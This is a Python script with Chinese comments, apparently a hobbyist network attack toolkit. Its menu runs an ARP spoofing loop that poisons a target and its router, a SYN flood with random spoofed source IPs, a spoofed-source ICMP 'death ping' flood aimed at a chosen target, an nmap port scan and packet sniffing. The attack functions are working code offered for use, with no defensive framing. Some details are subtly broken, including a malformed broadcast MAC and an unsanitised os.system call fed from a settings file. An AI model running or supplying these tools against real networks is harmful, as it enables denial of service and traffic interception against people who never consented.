#The program must be run in utf-8. 必须以UTF-8编码运行程序。
try:
    from scapy.all import *#要用的模块有scapy没有就在命令行跑这条命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy
    from scapy.utils import PcapReader, PcapWriter
except:
    print("你是不是忘了安装scapy模块")
    print("scapy安装命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy")
    import sys
    input("按回车退出")
    sys.exit(0)

try:
    import nmap
except:
    print("你是不是忘了安装python-nmap模块")
    print("请先在nmap的官网下载nmap www.nmap.org")
    print("如何执行指令windows:python -m pip install python-nmap liunx:sudo python -m pip install python-nmap")
    import sys
    input("按回车退出")
    sys.exit(0)

import time, random, sys, uuid, os#导入需要的自带模块

print("The program must be run in utf-8.")#不知道为什么总有人用其他编码导致中文出问题。
print("必须以UTF-8编码运行程序")
print("所有模块都可以按ctrl + c 退出")#为什么还有人不知道ctrl + c的神奇组合

mac=uuid.UUID(int = uuid.getnode()).hex[-12:]#获取本机MAC地址
mac = ":".join([mac[e:e+2] for e in range(0,11,2)])
print(mac)

file = open("color.setting",'r')#让用户可以选择程序运行时的颜色
color = file.read()
os.system("color " + color)

def ARP_poof(): #ARP欺骗带ARPPing(内网用)。
    target = input("Enter the target IP like 127.0.0.1:")#目标输入不用我多说把。
    router = input("Please enter the router IP address like 192.168.1.1:")
    arp_Ping_fall = False
    arp_test = False
    arp_test_two = False
    print("Try to arpPing the target...")
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=target),timeout=1000)#ARPPing(arp目标扫描) PS:不知道为什么有时会失效。
    for snd,rcv in ans:
        print("arpPing...Done")
        print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
        arp_test = True

    print("Try to arpPing the router...")
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=router),timeout=1000)#康康上面的注释。
    for snd,rcv in ans:
        print("arpPing...Done")
        print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
        arp_test_two = True

    if arp_test == False or arp_test_two == False:
        arp_Ping_fall = True
        print("ARP ping fall.")

    packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
    packet_two = Ether()/ARP(psrc=target,pdst=router)

    while True:#攻击主循环
        try:
            if arp_Ping_fall:
                break
            sendp(packet)
            sendp(packet_two)
            print(packet.show())
        except KeyboardInterrupt:
            break

def SYN_flood(): #SYN flood attack SYN洪水不用我说把
    target = input("Enter the target IP like 127.0.0.1:")#必须有的目标输入。
    port = input("enter port:")#攻击端口

    while True:#攻击主循环
        try:#一个ctrl + c退出模块自己体会
            psrc = "%i.%i.%i.%i" %(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))#生成随机IP(伪造IP) PS:可以在数据包生成时把代码简化用RandIP函数,我懒得写。
            send(IP(src=psrc,dst=target)/TCP(dport=int(port), flags="S"))#生成&发送攻击数据包
        except KeyboardInterrupt:
            break

def nmap_port_scan():#nmap扫描所有端口状态
    target = input("Enter the target IP like 127.0.0.1:")
    nm = nmap.PortScanner()
    nm.scan(target, '1-9999')
    for host in nm.all_hosts():
        print('-----------------------------------')
        print('Host:%s(%s)'%(host,nm[host].hostname()))
        print('State:%s'%nm[host].state())
        for proto in nm[host].all_protocols():
            print('-----------------------------------')
            print('Protocol:%s'%proto)
            lport = list(nm[host][proto].keys())
            for port in lport:
                print('port:%s\tstate:%s'%(port,nm[host][proto][port]['state']))

def DCHP_attack():
    pass

def death_ping():
    target = input("Enter the target like 127.0.0.1:")
    while True:
        pdst = "%i.%i.%i.%i" %(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
        send(IP(src=target,dst=pdst)/ICMP())

def scapy_sniff():
    data = sniff(prn=lambda x:x.summary())#scapy的sniff嗅探
    print("Start analyzing packets...")
    file = "sniff_data/" + time.strftime('%Y_%m_%d_%H_%M_%S') + ".pcap"
    writer = PcapWriter(file, append = True)
    for i in data:
        writer.write(i)
    writer.flush()
    writer.close()

def read_pcap():
    file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")
    file_name = "sniff_data/" + file_name
    reader = PcapReader(file_name)
    packets = reader.read_all(-1)
    for i in packets:
        i.show()

while True:#喜闻乐见的主循环
    print("quit(0)")
    print("ARPspoof with ARPPing.(1)")
    print("SYN flood(2)")
    print("All port status scans(3)")
    print("Death of Ping(4)")
    print("Sniff(5)")
    print("Read Save pcap file(6)")
    print("退出(0)")
    print("ARP欺骗带ARPPing(内网用)。(1)")
    print("SYN洪水(2)")
    print("所有端口状态扫描(3)")
    print("死亡之Ping(4)")
    print("sniff嗅探(5)")
    print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")

    choose = input(">>>")#用户选择输入
    try:
        choose = int(choose)
    except:
        print("Must enter int")

    if choose == 0:#无聊的判断时间 PS:这里想吐槽python没有什么关键字你知道了把。
        sys.exit(0)
    elif choose == 1:#时刻提醒自己要两的等于号。
        ARP_poof()
    elif choose == 2:
        SYN_flood()
    elif choose == 3:
        nmap_port_scan()
    elif choose == 4:
        death_ping()
    elif choose == 5:
        scapy_sniff()
    elif choose == 6:
        read_pcap()
